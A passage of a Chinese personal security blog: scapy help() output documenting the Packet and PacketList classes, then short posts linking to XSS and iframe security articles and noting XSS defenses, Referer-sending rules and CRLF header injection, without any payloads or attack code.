post_dissect(self, s)</span><br><span class="line"> |      DEV: is called right after the current layer has been dissected</span><br><span class="line"> |</span><br><span class="line"> |  post_dissection(self, pkt)</span><br><span class="line"> |      DEV: is called after the dissection of the whole packet</span><br><span class="line"> |</span><br><span class="line"> |  pre_dissect(self, s)</span><br><span class="line"> |      DEV: is called right before the current layer is dissected</span><br><span class="line"> |</span><br><span class="line"> |  prepare_cached_fields(self, flist)</span><br><span class="line"> |      Prepare the cached fields of the fields_desc dict</span><br><span class="line"> |</span><br><span class="line"> |  remove_payload(self)</span><br><span class="line"> |</span><br><span class="line"> |  remove_underlayer(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  route(self)</span><br><span class="line"> |</span><br><span class="line"> |  self_build(self, field_pos_list&#x3D;None)</span><br><span class="line"> |      Create the default layer regarding fields_desc dict</span><br><span class="line"> |</span><br><span class="line"> |      :param field_pos_list:</span><br><span class="line"> |</span><br><span class="line"> |  setfieldval(self, attr, val)</span><br><span class="line"> |</span><br><span class="line"> |  show(self, dump&#x3D;False, indent&#x3D;3, lvl&#x3D;&#39;&#39;, label_lvl&#x3D;&#39;&#39;)</span><br><span class="line"> |      Prints or returns (when &quot;dump&quot; is true) a hierarchical view of the</span><br><span class="line"> |      packet.</span><br><span class="line"> |</span><br><span class="line"> |      :param dump: determine if it prints or returns the string value</span><br><span class="line"> |      :param int indent: the size of indentation for each layer</span><br><span class="line"> |      :param str lvl: additional information about the layer lvl</span><br><span class="line"> |      :param str label_lvl: additional information about the layer fields</span><br><span class="line"> |      :return: return a hierarchical view if dump, else print it</span><br><span class="line"> |</span><br><span class="line"> |  show2(self, dump&#x3D;False, indent&#x3D;3, lvl&#x3D;&#39;&#39;, label_lvl&#x3D;&#39;&#39;)</span><br><span class="line"> |      Prints or returns (when &quot;dump&quot; is true) a hierarchical view of an</span><br><span class="line"> |      assembled version of the packet, so that automatic fields are</span><br><span class="line"> |      calculated (checksums, etc.)</span><br><span class="line"> |</span><br><span class="line"> |      :param dump: determine if it prints or returns the string value</span><br><span class="line"> |      :param int indent: the size of indentation for each layer</span><br><span class="line"> |      :param str lvl: additional information about the layer lvl</span><br><span class="line"> |      :param str label_lvl: additional information about the layer fields</span><br><span class="line"> |      :return: return a hierarchical view if dump, else print it</span><br><span class="line"> |</span><br><span class="line"> |  sprintf(self, fmt, relax&#x3D;1)</span><br><span class="line"> |      sprintf(format, [relax&#x3D;1]) -&gt; str</span><br><span class="line"> |      where format is a string that can include directives. A directive begins and</span><br><span class="line"> |      ends by % and has the following format %[fmt[r],][cls[:nb].]field%.</span><br><span class="line"> |</span><br><span class="line"> |      fmt is a classic printf directive, &quot;r&quot; can be appended for raw substitution</span><br><span class="line"> |      (ex: IP.flags&#x3D;0x18 instead of SA), nb is the number of the layer we want</span><br><span class="line"> |      (ex: for IP&#x2F;IP packets, IP:2.src is the src of the upper IP layer).</span><br><span class="line"> |      Special case : &quot;%.time%&quot; is the creation time.</span><br><span class="line"> |      Ex : p.sprintf(&quot;%.time% %-15s,IP.src% -&gt; %-15s,IP.dst% %IP.chksum% &quot;</span><br><span class="line"> |                     &quot;%03xr,IP.proto% %r,TCP.flags%&quot;)</span><br><span class="line"> |</span><br><span class="line"> |      Moreover, the format string can include conditional statements. A conditional</span><br><span class="line"> |      statement looks like : &#123;layer:string&#125; where layer is a layer name, and string</span><br><span class="line"> |      is the string to insert in place of the condition if it is true, i.e. if layer</span><br><span class="line"> |      is present. If layer is preceded by a &quot;!&quot;, the result is inverted. Conditions</span><br><span class="line"> |      can be imbricated. A valid statement can be :</span><br><span class="line"> |        p.sprintf(&quot;This is a&#123;TCP: TCP&#125;&#123;UDP: UDP&#125;&#123;ICMP:n ICMP&#125; packet&quot;)</span><br><span class="line"> |        p.sprintf(&quot;&#123;IP:%IP.dst% &#123;ICMP:%ICMP.type%&#125;&#123;TCP:%TCP.dport%&#125;&#125;&quot;)</span><br><span class="line"> |</span><br><span class="line"> |      A side effect is that, to obtain &quot;&#123;&quot; and &quot;&#125;&quot; characters, you must use</span><br><span class="line"> |      &quot;%(&quot; and &quot;%)&quot;.</span><br><span class="line"> |</span><br><span class="line"> |  summary(self, intern&#x3D;0)</span><br><span class="line"> |      Prints a one line summary of a packet.</span><br><span class="line"> |</span><br><span class="line"> |  ----------------------------------------------------------------------</span><br><span class="line"> |  Class methods inherited from scapy.packet.Packet:</span><br><span class="line"> |</span><br><span class="line"> |  from_hexcap(cls) from scapy.base_classes.Packet_metaclass</span><br><span class="line"> |</span><br><span class="line"> |  lower_bonds(self) from scapy.base_classes.Packet_metaclass</span><br><span class="line"> |</span><br><span class="line"> |  upper_bonds(self) from scapy.base_classes.Packet_metaclass</span><br><span class="line"> |</span><br><span class="line"> |  ----------------------------------------------------------------------</span><br><span class="line"> |  Data descriptors inherited from scapy.packet.Packet:</span><br><span class="line"> |</span><br><span class="line"> |  __dict__</span><br><span class="line"> |      dictionary for instance variables (if defined)</span><br><span class="line"> |</span><br><span class="line"> |  __weakref__</span><br><span class="line"> |      list of weak references to the object (if defined)</span><br><span class="line"> |</span><br><span class="line"> |  default_fields</span><br><span class="line"> |</span><br><span class="line"> |  direction</span><br><span class="line"> |</span><br><span class="line"> |  explicit</span><br><span class="line"> |</span><br><span class="line"> |  fields</span><br><span class="line"> |</span><br><span class="line"> |  fieldtype</span><br><span class="line"> |</span><br><span class="line"> |  name</span><br><span class="line"> |</span><br><span class="line"> |  original</span><br><span class="line"> |</span><br><span class="line"> |  overload_fields</span><br><span class="line"> |</span><br><span class="line"> |  overloaded_fields</span><br><span class="line"> |</span><br><span class="line"> |  packetfields</span><br><span class="line"> |</span><br><span class="line"> |  payload</span><br><span class="line"> |</span><br><span class="line"> |  post_transforms</span><br><span class="line"> |</span><br><span class="line"> |  raw_packet_cache</span><br><span class="line"> |</span><br><span class="line"> |  raw_packet_cache_fields</span><br><span class="line"> |</span><br><span class="line"> |  sent_time</span><br><span class="line"> |</span><br><span class="line"> |  sniffed_on</span><br><span class="line"> |</span><br><span class="line"> |  time</span><br><span class="line"> |</span><br><span class="line"> |  underlayer</span><br><span class="line"> |</span><br><span class="line"> |  wirelen</span><br><span class="line"> |</span><br><span class="line"> |  ----------------------------------------------------------------------</span><br><span class="line"> |  Data and other attributes inherited from scapy.packet.Packet:</span><br><span class="line"> |</span><br><span class="line"> |  class_default_fields &#x3D; &#123;&lt;class &#39;scapy.layers.inet.TCP&#39;&gt;: &#123;&#39;ack&#39;: 0, &#39;c...</span><br><span class="line"> |</span><br><span class="line"> |  class_default_fields_ref &#x3D; &#123;&lt;class &#39;scapy.layers.inet.TCP&#39;&gt;: [], &lt;clas...</span><br><span class="line"> |</span><br><span class="line"> |  class_dont_cache &#x3D; &#123;&#125;</span><br><span class="line"> |</span><br><span class="line"> |  class_fieldtype &#x3D; &#123;&lt;class &#39;scapy.layers.inet.TCP&#39;&gt;: &#123;&#39;ack&#39;: &lt;Field (TC...</span><br><span class="line"> |</span><br><span class="line"> |  class_packetfields &#x3D; &#123;&lt;class &#39;scapy.layers.inet.TCP&#39;&gt;: [], &lt;class &#39;sca...</span><br><span class="line"> |</span><br><span class="line"> |  match_subclass &#x3D; False</span><br><span class="line"> |</span><br><span class="line"> |  show_indent &#x3D; 1</span><br><span class="line"> |</span><br><span class="line"> |  show_summary &#x3D; True</span><br><span class="line"> |</span><br><span class="line"> |  ----------------------------------------------------------------------</span><br><span class="line"> |  Methods inherited from scapy.base_classes._CanvasDumpExtended:</span><br><span class="line"> |</span><br><span class="line"> |  pdfdump(self, filename&#x3D;None, **kargs)</span><br><span class="line"> |      pdfdump(filename&#x3D;None, layer_shift&#x3D;0, rebuild&#x3D;1)</span><br><span class="line"> |</span><br><span class="line"> |      Creates a PDF file describing a packet. If filename is not provided a</span><br><span class="line"> |      temporary file is created and xpdf is called.</span><br><span class="line"> |</span><br><span class="line"> |      :param filename: the file&#39;s filename</span><br><span class="line"> |</span><br><span class="line"> |  psdump(self, filename&#x3D;None, **kargs)</span><br><span class="line"> |      psdump(filename&#x3D;None, layer_shift&#x3D;0, rebuild&#x3D;1)</span><br><span class="line"> |</span><br><span class="line"> |      Creates an EPS file describing a packet. If filename is not provided a</span><br><span class="line"> |      temporary file is created and gs is called.</span><br><span class="line"> |</span><br><span class="line"> |      :param filename: the file&#39;s filename</span><br><span class="line"> |</span><br><span class="line"> |  svgdump(self, filename&#x3D;None, **kargs)</span><br><span class="line"> |      svgdump(filename&#x3D;None, layer_shift&#x3D;0, rebuild&#x3D;1)</span><br><span class="line"> |</span><br><span class="line"> |      Creates an SVG file describing a packet. If filename is not provided a</span><br><span class="line"> |      temporary file is created and gs is called.</span><br><span class="line"> |</span><br><span class="line"> |      :param filename: the file&#39;s filename</span><br></pre></td></tr></table></figure>
<p>sniff返回的scapy.plist.PacketList类型</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">Help on PacketList <span class="keyword">in</span> module scapy.plist object:</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PacketList</span><span class="params">(scapy.base_classes.BasePacketList, scapy.base_classes._CanvasDumpExtended)</span></span></span><br><span class="line"><span class="class"> |  <span class="title">PacketList</span><span class="params">(res=None, name=<span class="string">'PacketList'</span>, stats=None)</span></span></span><br><span class="line"><span class="class"> |</span></span><br><span class="line"><span class="class"> |  <span class="title">Method</span> <span class="title">resolution</span> <span class="title">order</span>:</span></span><br><span class="line"> |      PacketList</span><br><span class="line"> |      scapy.base_classes.BasePacketList</span><br><span class="line"> |      scapy.base_classes._CanvasDumpExtended</span><br><span class="line"> |      builtins.object</span><br><span class="line"> |</span><br><span class="line"> |  Methods defined here:</span><br><span class="line"> |</span><br><span class="line"> |  __add__(self, other)</span><br><span class="line"> |</span><br><span class="line"> |  __getattr__(self, attr)</span><br><span class="line"> |</span><br><span class="line"> |  __getitem__(self, item)</span><br><span class="line"> |</span><br><span class="line"> |  __getslice__(self, *args, **kargs)</span><br><span class="line"> |</span><br><span class="line"> |  __getstate__(self)</span><br><span class="line"> |      create a basic representation of the instance, used <span class="keyword">in</span> conjunction <span class="keyword">with</span> __setstate__() e.g. by pickle  <span class="comment"># noqa: E501</span></span><br><span class="line"> |      :<span class="keyword">return</span>: dict representing this instance</span><br><span class="line"> |</span><br><span class="line"> |  __init__(self, res=<span class="literal">None</span>, name=<span class="string">'PacketList'</span>, stats=<span class="literal">None</span>)</span><br><span class="line"> |      create a packet list <span class="keyword">from</span> a list of packets</span><br><span class="line"> |      res: the list of packets</span><br><span class="line"> |      stats: a list of classes that will appear <span class="keyword">in</span> the stats (defaults to [TCP,UDP,ICMP])</span><br><span class="line"> |</span><br><span class="line"> |  __len__(self)</span><br><span class="line"> |</span><br><span class="line"> |  __repr__(self)</span><br><span class="line"> |      Return repr(self).</span><br><span class="line"> |</span><br><span class="line"> |  __setstate__(self, state)</span><br><span class="line"> |      set instance attributes to values given by state, used <span class="keyword">in</span> conjunction <span class="keyword">with</span> __getstate__() e.g. by pickle  <span class="comment"># noqa: E501</span></span><br><span class="line"> |      :param state: dict representing this instance</span><br><span class="line"> |</span><br><span class="line"> |  afterglow(self, src=<span class="literal">None</span>, event=<span class="literal">None</span>, dst=<span class="literal">None</span>, **kargs)</span><br><span class="line"> |      Experimental clone attempt of http://sourceforge.net/projects/afterglow</span><br><span class="line"> |      each datum is reduced as src -&gt; event -&gt; dst and the data are graphed.</span><br><span class="line"> |      by default we have IP.src -&gt; IP.dport -&gt; IP.dst</span><br><span class="line"> |</span><br><span class="line"> |  canvas_dump(self, **kargs)</span><br><span class="line"> |</span><br><span class="line"> |  conversations(self, getsrcdst=<span class="literal">None</span>, **kargs)</span><br><span class="line"> |      Graphes a conversations between sources <span class="keyword">and</span> destinations <span class="keyword">and</span> display it</span><br><span class="line"> |      (using graphviz <span class="keyword">and</span> imagemagick)</span><br><span class="line"> |      getsrcdst: a function that takes an element of the list <span class="keyword">and</span></span><br><span class="line"> |                 returns the source, the destination <span class="keyword">and</span> optionally</span><br><span class="line"> |                 a label. By default, returns the IP source <span class="keyword">and</span></span><br><span class="line"> |                 destination <span class="keyword">from</span> IP <span class="keyword">and</span> ARP layers</span><br><span class="line"> |      type: output type (svg, ps, gif, jpg, etc.), passed to dot<span class="string">'s "-T" option  # noqa: E501</span></span><br><span class="line"><span class="string"> |      target: filename or redirect. Defaults pipe to Imagemagick'</span>s display program  <span class="comment"># noqa: E501</span></span><br><span class="line"> |      prog: which graphviz program to use</span><br><span class="line"> |</span><br><span class="line"> |  diffplot(self, f, delay=<span class="number">1</span>, lfilter=<span class="literal">None</span>, **kargs)</span><br><span class="line"> |      diffplot(f, delay=<span class="number">1</span>, lfilter=<span class="literal">None</span>)</span><br><span class="line"> |      Applies a function to couples (l[i],l[i+delay])</span><br><span class="line"> |</span><br><span class="line"> |      A list of matplotlib.lines.Line2D <span class="keyword">is</span> returned.</span><br><span class="line"> |</span><br><span class="line"> |  display(self)</span><br><span class="line"> |      deprecated. <span class="keyword">is</span> show()</span><br><span class="line"> |</span><br><span class="line"> |  filter(self, func)</span><br><span class="line"> |      Returns a packet list filtered by a truth function. This truth</span><br><span class="line"> |      function has to take a packet <span class="keyword">as</span> the only argument <span class="keyword">and</span> <span class="keyword">return</span> a boolean value.</span><br><span class="line"> |</span><br><span class="line"> |  hexdump(self, lfilter=<span class="literal">None</span>)</span><br><span class="line"> |      Same <span class="keyword">as</span> nsummary(), <span class="keyword">except</span> that packets are also hexdumped</span><br><span class="line"> |      lfilter: a truth function that decides whether a packet must be displayed</span><br><span class="line"> |</span><br><span class="line"> |  hexraw(self, lfilter=<span class="literal">None</span>)</span><br><span class="line"> |      Same <span class="keyword">as</span> nsummary(), <span class="keyword">except</span> that <span class="keyword">if</span> a packet has a Raw layer, it will be hexdumped  <span class="comment"># noqa: E501</span></span><br><span class="line"> |      lfilter: a truth function that decides whether a packet must be displayed</span><br><span class="line"> |</span><br><span class="line"> |  make_lined_table(self, *args, **kargs)</span><br><span class="line"> |      Same <span class="keyword">as</span> make_table, but <span class="keyword">print</span> a table <span class="keyword">with</span> lines</span><br><span class="line"> |</span><br><span class="line"> |  make_table(self, *args, **kargs)</span><br><span class="line"> |      Prints a table using a function that returns <span class="keyword">for</span> each packet its head column value, head row value <span class="keyword">and</span> displayed value  <span class="comment"># noqa: E501</span></span><br><span class="line"> |      ex: p.make_table(<span class="keyword">lambda</span> x:(x[IP].dst, x[TCP].dport, x[TCP].sprintf(<span class="string">"%flags%"</span>))</span><br><span class="line"> |</span><br><span class="line"> |  make_tex_table(self, *args, **kargs)</span><br><span class="line"> |      Same <span class="keyword">as</span> make_table, but <span class="keyword">print</span> a table <span class="keyword">with</span> LaTeX syntax</span><br><span class="line"> |</span><br><span class="line"> |  multiplot(self, f, lfilter=<span class="literal">None</span>, plot_xy=<span class="literal">False</span>, **kargs)</span><br><span class="line"> |      Uses a function that returns a label <span class="keyword">and</span> a value <span class="keyword">for</span> this label, then</span><br><span class="line"> |      plots all the values label by label.</span><br><span class="line"> |</span><br><span class="line"> |      A list of matplotlib.lines.Line2D <span class="keyword">is</span> returned.</span><br><span class="line"> |</span><br><span class="line"> |  nsummary(self, prn=<span class="literal">None</span>, lfilter=<span class="literal">None</span>)</span><br><span class="line"> |      prints a summary of each packet <span class="keyword">with</span> the packet<span class="string">'s number</span></span><br><span class="line"><span class="string"> |      prn:     function to apply to each packet instead of lambda x:x.summary()</span></span><br><span class="line"><span class="string"> |      lfilter: truth function to apply to each packet to decide whether it will be displayed</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  nzpadding(self, lfilter=None)</span></span><br><span class="line"><span class="string"> |      Same as padding() but only non null padding</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  padding(self, lfilter=None)</span></span><br><span class="line"><span class="string"> |      Same as hexraw(), for Padding layer</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  plot(self, f, lfilter=None, plot_xy=False, **kargs)</span></span><br><span class="line"><span class="string"> |      Applies a function to each packet to get a value that will be plotted</span></span><br><span class="line"><span class="string"> |      with matplotlib. A list of matplotlib.lines.Line2D is returned.</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |      lfilter: a truth function that decides whether a packet must be plotted</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  rawhexdump(self)</span></span><br><span class="line"><span class="string"> |      Prints an hexadecimal dump of each packet in the list</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  replace(self, *args, **kargs)</span></span><br><span class="line"><span class="string"> |      lst.replace(&lt;field&gt;,[&lt;oldvalue&gt;,]&lt;newvalue&gt;)</span></span><br><span class="line"><span class="string"> |      lst.replace( (fld,[ov],nv),(fld,[ov,]nv),...)</span></span><br><span class="line"><span class="string"> |        if ov is None, all values are replaced</span></span><br><span class="line"><span class="string"> |      ex:</span></span><br><span class="line"><span class="string"> |        lst.replace( IP.src, "192.168.1.1", "10.0.0.1" )</span></span><br><span class="line"><span class="string"> |        lst.replace( IP.ttl, 64 )</span></span><br><span class="line"><span class="string"> |        lst.replace( (IP.ttl, 64), (TCP.sport, 666, 777), )</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  sessions(self, session_extractor=None)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  show(self, *args, **kargs)</span></span><br><span class="line"><span class="string"> |      Best way to display the packet list. Defaults to nsummary() method</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  sr(self, multi=0)</span></span><br><span class="line"><span class="string"> |      sr([multi=1]) -&gt; (SndRcvList, PacketList)</span></span><br><span class="line"><span class="string"> |      Matches packets in the list and return ( (matched couples), (unmatched packets) )</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  summary(self, prn=None, lfilter=None)</span></span><br><span class="line"><span class="string"> |      prints a summary of each packet</span></span><br><span class="line"><span class="string"> |      prn:     function to apply to each packet instead of lambda x:x.summary()</span></span><br><span class="line"><span class="string"> |      lfilter: truth function to apply to each packet to decide whether it will be displayed</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  timeskew_graph = _packetlist_timeskew_graph(self, ip, **kargs)</span></span><br><span class="line"><span class="string"> |      Tries to graph the timeskew between the timestamps and real time for a given ip</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  ----------------------------------------------------------------------</span></span><br><span class="line"><span class="string"> |  Data descriptors defined here:</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  __dict__</span></span><br><span class="line"><span class="string"> |      dictionary for instance variables (if defined)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  __weakref__</span></span><br><span class="line"><span class="string"> |      list of weak references to the object (if defined)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  listname</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  res</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  stats</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  ----------------------------------------------------------------------</span></span><br><span class="line"><span class="string"> |  Methods inherited from scapy.base_classes._CanvasDumpExtended:</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  pdfdump(self, filename=None, **kargs)</span></span><br><span class="line"><span class="string"> |      pdfdump(filename=None, layer_shift=0, rebuild=1)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |      Creates a PDF file describing a packet. If filename is not provided a</span></span><br><span class="line"><span class="string"> |      temporary file is created and xpdf is called.</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |      :param filename: the file'</span>s filename</span><br><span class="line"> |</span><br><span class="line"> |  psdump(self, filename=<span class="literal">None</span>, **kargs)</span><br><span class="line"> |      psdump(filename=<span class="literal">None</span>, layer_shift=<span class="number">0</span>, rebuild=<span class="number">1</span>)</span><br><span class="line"> |</span><br><span class="line"> |      Creates an EPS file describing a packet. If filename <span class="keyword">is</span> <span class="keyword">not</span> provided a</span><br><span class="line"> |      temporary file <span class="keyword">is</span> created <span class="keyword">and</span> gs <span class="keyword">is</span> called.</span><br><span class="line"> |</span><br><span class="line"> |      :param filename: the file<span class="string">'s filename</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |  svgdump(self, filename=None, **kargs)</span></span><br><span class="line"><span class="string"> |      svgdump(filename=None, layer_shift=0, rebuild=1)</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |      Creates an SVG file describing a packet. If filename is not provided a</span></span><br><span class="line"><span class="string"> |      temporary file is created and gs is called.</span></span><br><span class="line"><span class="string"> |</span></span><br><span class="line"><span class="string"> |      :param filename: the file'</span>s filename</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/05/11/suibi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/05/11/suibi/" class="post-title-link" itemprop="url">随手记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-05-11 15:39:02" itemprop="dateCreated datePublished" datetime="2019-05-11T15:39:02+08:00">2019-05-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-05-14 20:49:37" itemprop="dateModified" datetime="2019-05-14T20:49:37+08:00">2019-05-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="随手记录安全文章"><a href="#随手记录安全文章" class="headerlink" title="随手记录安全文章"></a>随手记录安全文章</h3><p><a href="https://blog.csdn.net/yanner_/article/details/81428965" target="_blank" rel="noopener">iframe安全问题</a><br><a href="http://html5sec.org" target="_blank" rel="noopener">html5标签的xss方法大全</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/05/10/xss%E7%9B%B8%E5%85%B3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/05/10/xss%E7%9B%B8%E5%85%B3/" class="post-title-link" itemprop="url">xss相关</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-05-10 11:20:07 / 修改时间：15:02:21" itemprop="dateCreated datePublished" datetime="2019-05-10T11:20:07+08:00">2019-05-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p>X-XSS-Protection<br>csp</p>
<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h3 id="referer"><a href="#referer" class="headerlink" title="referer"></a>referer</h3><p> 会传送referer<br>https-&gt;https<br>http-&gt;https<br>http-&gt;http</p>
<p> 不会传送refer<br>https-&gt;http</p>
<p><a href="https://xz.aliyun.com/t/83" target="_blank" rel="noopener">https://xz.aliyun.com/t/83</a></p>
<h3 id="crlf-头注入"><a href="#crlf-头注入" class="headerlink" title="crlf 头注入"></a>crlf 头注入</h3><p><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html</a><br>危害点在于攻击者可控请求头</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
